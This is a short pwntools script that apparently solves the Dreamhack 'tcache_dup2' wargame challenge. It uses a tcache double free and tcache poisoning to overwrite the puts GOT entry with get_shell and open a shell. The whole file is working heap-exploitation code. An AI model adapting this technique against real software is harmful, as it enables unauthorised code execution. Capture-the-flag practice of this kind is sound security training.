from pwn import *

p = remote('host3.dreamhack.games', '13483')
#p = process('./tcache_dup2')
e = ELF('./tcache_dup2')
puts_got = e.got['puts']
shell = e.symbols['get_shell']

print(hex(shell))
print(hex(puts_got))

def create(size, data):
  p.sendlineafter(b"> ", b"1")
  p.sendlineafter(b"Size: ", str(size).encode())
  p.sendlineafter(b"Data: ", data)

def modify(idx, size, data):
  p.sendlineafter(b"> ", b"2")
  p.sendlineafter(b"idx: ", str(idx).encode())
  p.sendlineafter(b"Size: ", str(size).encode())
  p.sendlineafter(b"Data: ", data)

def delete(idx):
  p.sendlineafter(b"> ", b"3")
  p.sendlineafter(b"idx: ", str(idx).encode())
  
create(0x10, b"A")
create(0x10, b"A")
create(0x10, b"A")

delete(0)
delete(1)
delete(2)
modify(2, 0x10, b"A"*8)

delete(2)

create(0x10, p64(puts_got))
create(0x10, b"A"*4)
create(0x10, p64(shell))


p.interactive()